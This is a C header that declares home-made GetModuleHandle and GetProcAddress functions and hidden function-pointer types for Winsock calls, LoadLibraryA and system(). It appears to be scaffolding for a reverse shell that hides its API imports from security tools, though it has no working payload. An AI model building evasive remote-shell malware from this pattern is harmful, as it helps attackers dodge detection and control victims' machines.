#include <stdio.h>
#include <winsock2.h>

#ifndef FUNCTIONSSIGNATURES_H_INCLUDED
#define FUNCTIONSSIGNATURES_H_INCLUDED

// Our implementation of GetModuleHandle.
HMODULE WINAPI pGetModuleHandle(LPCWSTR sModuleName);

// Our implementation of GetProcAddress.
FARPROC WINAPI pGetProcAddress(HMODULE hMod, char* sProcName);

// Signature of LoadLibraryA
typedef HMODULE(WINAPI* HIDDEN_DLL_FUNC_LoadLibrary)(LPCSTR lpFileName);

// Signature of WSAStartup
typedef int(CALLBACK* HIDDEN_DLL_FUNC_WSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);

// Signature of WSAGetLastError
typedef int(CALLBACK* HIDDEN_DLL_FUNC_WSAGetLastError)();

// Signature of WSASocket
typedef SOCKET(CALLBACK* HIDDEN_DLL_FUNC_WSASocket)(int af, int type, int protocol, LPWSAPROTOCOL_INFOW lpProtocolInfo, GROUP g, DWORD dwFlags);

// Signature of inet_addr
typedef unsigned long(CALLBACK* HIDDEN_DLL_FUNC_inet_addr)(const char* cp);

// Signature of WSAConnect
typedef int(CALLBACK* HIDDEN_DLL_FUNC_WSAConnect)(SOCKET s, SOCKADDR* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);

// Signature of send
typedef int(CALLBACK* HIDDEN_DLL_FUNC_send)(SOCKET s, const char* buf, int len, int flags);

// Signature of recv
typedef int(CALLBACK* HIDDEN_DLL_FUNC_recv)(SOCKET s, char* buf, int len, int flags);

// Signature of system
typedef int(CALLBACK* HIDDEN_DLL_FUNC_system)(const char* command);

#endif // FUNCTIONSSIGNATURES_H_INCLUDED

